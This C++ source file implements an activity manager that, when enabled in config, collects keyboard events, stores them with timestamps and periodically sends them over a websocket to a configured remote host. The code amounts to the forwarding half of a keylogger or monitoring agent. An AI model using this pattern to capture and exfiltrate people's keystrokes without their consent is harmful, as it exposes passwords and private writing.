#include "activity_manager.h"
#include <boost/asio/strand.hpp>
#include <boost/asio/spawn.hpp>

#include "logger.h"
#include "kb_activity.h"

activity_manager_t::activity_manager_t(net::io_context& io, const config_t& cfg)
    : _io(io)
    , _push_timer(net::make_strand(io))
    , _wss_client(std::make_shared<wss_client_t>(io))
    , _storage(cfg.get_section("storage"))
{
    auto kb_cfg = cfg.get_section("keyboard");
    if (kb_cfg["enabled"].as_boolean())
    {
        std::unique_ptr<activity_t> activity(new kb_activity_t(kb_cfg));
        activity->set_on_data([this](boost::json::value jv) {
            const auto ts = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count();
            model::exchange_t msg{ 0, static_cast<std::size_t>(ts), boost::json::serialize(jv) };
            _storage.insert(std::move(msg));
                              });
        auto p = _activities.insert({ "keyboard", std::move(activity) });
        if (!p.second)
        {
            SPDLOG_ERROR("failed to insert activity [keyboard]");
        }
    }

    // TODO : add other activity monitors    

    auto geneal_cfg = cfg.get_section("general");
    const std::string host = geneal_cfg["host"].value_or("");
    const std::string port = geneal_cfg["port"].value_or("");

    SPDLOG_INFO("connecting to [{}:{}]", host, port);
    _wss_client->connect(host, port);
}

activity_manager_t::~activity_manager_t()
{
    _push_timer.expires_at(std::chrono::steady_clock::time_point::min());
}

void activity_manager_t::startup()
{
    net::spawn(_io,
               [self = shared_from_this()](net::yield_context yield)
    {
        while (!self->_stop)
        {
            const auto now = std::chrono::system_clock::now();

            boost::system::error_code ec;
            self->_push_timer.expires_from_now(PUSH_TIMEOUT);
            self->_push_timer.async_wait(yield[ec]);

            // check if we should stop...
            if (ec == boost::asio::error::operation_aborted ||
                self->_push_timer.expires_at() == std::chrono::steady_clock::time_point::min())
            {
                SPDLOG_DEBUG("breaking push loop");
                break;
            }

            // grab data from DB and push

            const auto post_now = std::chrono::system_clock::now();

            // query events
            auto events = self->_storage.get_range(now, post_now);

            SPDLOG_INFO("obtained [{}] events", events.size());

            // traverse events and push for sending...
            for (auto& event : events)
            {
                self->_wss_client->send(std::move(event));
            }

            // TODO : add continuation for exchange_t 
            //        to delete from storage on successful push

            // remove in range
            self->_storage.remove_range(now, post_now);
        }
    });
}

void activity_manager_t::shutdown()
{
    net::post(_io, [self = shared_from_this()]()
    {
        self->_stop = true;
    });
}

void activity_manager_t::start_activity(const std::string& activity_name)
{
    net::post(_io, [self = shared_from_this(), activity_name]()
    {
        self->update(activity_name,
                     [](activity_t* activity) {
                         activity->start();
                     });
    });
}

void activity_manager_t::stop_activity(const std::string& activity_name)
{
    net::post(_io, [self = shared_from_this(), activity_name]()
    {
        self->update(activity_name,
                     [](activity_t* activity) {
                         activity->stop();
                     });
    });
}

void activity_manager_t::update(const std::string& activity_name,
                                std::function<void(activity_t*)> handler)
{
    auto it = _activities.find(activity_name);
    if (it == _activities.end())
    {
        SPDLOG_ERROR("failed to find activity [{}]", activity_name);
        return;
    }

    handler(it->second.get());
}